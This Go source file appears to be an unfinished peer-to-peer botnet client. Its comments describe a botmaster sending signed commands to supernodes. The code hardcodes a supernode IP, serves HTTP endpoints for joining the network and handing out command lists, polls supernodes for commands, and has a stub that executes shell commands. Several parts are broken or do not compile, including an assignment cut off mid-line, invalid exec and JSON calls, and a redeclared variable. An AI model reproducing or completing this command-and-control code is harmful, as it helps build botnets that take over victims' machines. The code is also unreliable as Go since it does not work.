package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os/exec"
	"time"
)

type BotFunc interface {
	Online()
	StartSupernode()
	AddNewSupernode(node string)
	InvokeCommand()
}

type Bot struct {
	IsSupernode bool
	Supernodes  []string
	Commands    []string
	Publickey   string
	TimeToSupernode *time.Timer
	OnlineTicker *time.Ticker
}

func main() {
	//List of supernodes
	//Public key used to decrypt a command sent from botmaster encrypted with private key
	//Start as a worker, if connection can be recieved, switch to supernode
	//Receive Command
	//Send Command
	//Execute Command
	bot := Bot{
		IsSupernode: false,
		Supernodes: []string{"77.88.124.125:8080"},
		Commands: []string{},
		Publickey: "",
		TimeToSupernode: time.NewTimer(5 * time.Minute),
		OnlineTicker: time.NewTicker(5 * time.Minute),
	}
	go bot.StartSupernode()
	bot.Online()
}

func(b *Bot)StartSupernode() {
	defer func() {
		recover()
	}()
	http.HandleFunc("/AddNewSupernode", func(w http.ResponseWriter, r *http.Request) {
		var result map[string]interface{}
		err := json.Unmarshal(r.Body, &result)
		b.IsSupernode = true
		b.TimeToSupernode.Stop()
		w.Write([]byte(json.Marshal(b)))
	})
	http.HandleFunc("/ReceiveCommand", func(w http.ResponseWriter, r *http.Request) {
		b.Commands =
	})
	http.HandleFunc("/Online", func(w http.ResponseWriter, r *http.Request) {
		go b.AddNewSupernode(r.RemoteAddr)
		var respBody map[string][]string
		respBody["supernodes"] = b.Supernodes
		respBody["commands"] = b.Commands
		json.NewEncoder(w).Encode(respBody)
	})
	if err := http.ListenAndServe(":8080", nil); err != nil {
		panic(err)
	}
}

func(b *Bot)Online() {
	for {
		for _, supernode := range b.Supernodes {
			resp, err := http.Get(supernode + "/Online")
			if err != nil {
				panic(err)
			}
			var respBody map[string][]string
			json.NewDecoder(resp.Body).Decode(&respBody)
			b.Supernodes = UniqueSupernodes(append(b.Supernodes, respBody["supernodes"]...))
			b.Commands = respBody["commands"]
			resp.Body.Close()
		}
	<-b.OnlineTicker.C
	}
}

func(b *Bot)AddNewSupernode(node string) {
	message := map[string]interface{}{
		"ip": node,
	}

	bytesRepresentation, err := json.Marshal(message)
	if err != nil {
		log.Fatalln(err)
	}

	resp, err := http.Post(node + "/BecomeSupernode", "application/json", bytes.NewBuffer(bytesRepresentation))
	if err != nil {
		log.Fatalln(err)
	}

	var result map[string]interface{}

	json.NewDecoder(resp.Body).Decode(&result)

	log.Println(result)
	log.Println(result["data"])

}

func(b *Bot)InvokeCommand() {
	cmd := exec.Command("/bin/ls", []string{app, "-l"}, nil, "", exec.DevNull, exec.Pipe, exec.Pipe)

	var b bytes.Buffer
	io.Copy(&b, cmd.Stdout)
	fmt.Println(b.String())

}

func UniqueSupernodes(supernodes []string) []string {
	keys := make(map[string]bool)
	list := []string{}

	for _, entry := range supernodes {
		if _, value := keys[entry]; !value {
			keys[entry] = true
			list = append(list, entry)
		}
	}
	return list
}